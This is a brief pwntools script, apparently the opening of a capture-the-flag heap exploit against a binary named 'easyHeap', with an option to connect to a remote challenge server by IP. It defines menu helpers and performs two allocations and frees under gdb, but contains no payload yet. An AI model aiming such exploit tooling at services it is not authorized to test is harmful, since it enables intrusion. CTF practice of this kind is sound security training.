from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./easyHeap')

debug = 1

if debug:
    io = process('./easyHeap')
else:
    io = remote('43.143.254.94',10150)

def p():
    gdb.attach(proc.pidof(io)[0])

def add(size,content):
    io.sendlineafter(b"Input Option: ",str(1))
    io.sendlineafter(b"Size: ",str(size))
    io.sendafter(b"Content: ",content)

def delete(idx):
    io.sendlineafter(b"Input Option: ",str(2))
    io.sendlineafter(b"Note id: ",str(idx))

def show(idx):
    io.sendlineafter(b"Input Option: ",str(3))
    io.sendlineafter(b"Note id: ",str(idx))

add(1048,b'aaaaa') # idx = 0 
add(1048,b'aaaaa') # idx = 1 
delete(0)
p()
delete(1)
#show(3)

io.interactive()
